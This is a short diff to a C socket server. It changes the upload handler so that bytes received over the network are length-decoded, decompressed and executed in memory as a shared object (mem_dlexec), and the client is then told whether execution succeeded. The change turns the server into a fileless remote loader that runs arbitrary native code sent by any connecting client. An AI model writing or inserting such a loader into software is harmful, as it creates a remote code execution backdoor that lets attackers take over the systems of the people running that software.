@@ -7,6 +7,7 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <unistd.h> // read(), write(), close()
+#include "loadnexec.h"
 
 #define SA struct sockaddr
 #define MAX 50000
@@ -33,8 +34,17 @@ void upload(int connfd) {
         memcpy(so.len, &buff[0], 4);
         so.buffer = &buff[4]; //
 
-        char *tmpMsg = "Recieved data!";
-        write(connfd, tmpMsg, strlen(tmpMsg));
+        // convert first 4 character (2 bytes) to corresponding hex value
+        int buffer_size = (int)strtol(so.len, 0, 16);
+        char *plain_so = decode_and_decompress(so.buffer, buffer_size);
+        int res = mem_dlexec(plain_so);
+        if (res == 0){
+            char *tmpMsg = "Successfullye executed shared object!";
+            write(connfd, tmpMsg, strlen(tmpMsg));
+        } else {
+            char *tmpMsg = "Error executing shared object!";
+            write(connfd, tmpMsg, strlen(tmpMsg));
+        }
     }
 }
 
